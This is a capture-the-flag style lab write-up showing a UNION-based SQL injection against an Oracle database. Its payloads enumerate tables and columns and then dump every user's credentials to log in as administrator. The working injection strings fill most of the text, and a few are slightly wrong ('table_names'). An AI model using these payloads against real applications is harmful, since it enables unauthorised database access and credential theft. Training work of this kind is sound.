# SQL injection attack, listing the database contents on Oracle
* This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
* The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the nmae of this table and the columns it contains, the retrieve the contents of the table to obtain the username and password of all users.
	* To solve the lab, log in as the "administrator" user.

### 1. Determine the corresponding number of columns
* Capture the requst of category filter and using UNION attack to detemine the corresponding number of columns.
	* When testing for two columns, 200 status code is given on the response. It means there has two columns.
```sql
' UNION SELECT NULL,NULL--
```
* However, it does not work with any number of columns
#### Check the column number for Oracle
* When testing for two columns, 200 status is given. It means that there has two columns.
```sql
' UNION SELECT NULL,NULL FROM dual--
```

### 2. Determine the string compatible columns
* Both columns are compatible to string data
```sql
' UNION SELECT 'abc','def' FROM dual--
```

### 3. Obtain table names
```sql
' UNION SELECT table_names,NULL FROM all_tables--
```
* As a result, all the tables names are given
	* From the result, an interesting table name `USERS_SPHBLJ` is found.

### 4. Determine the column names on table "USERS_SPHBLJ"
```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_SPHBLJ'--
```
* From the result, two interesting column names are found.

### 5. Extract data from the column "" on the "" table
```sql
' UNION SELECT USERNAME_EXVMLZ, PASSWORD_IUZHBZ FROM USERS_SPHBLJ--
```
* As a result, all the users' credentials are given.

* With obtained credentials, log in as "administrator" is granted. As a result, the lab is solved.
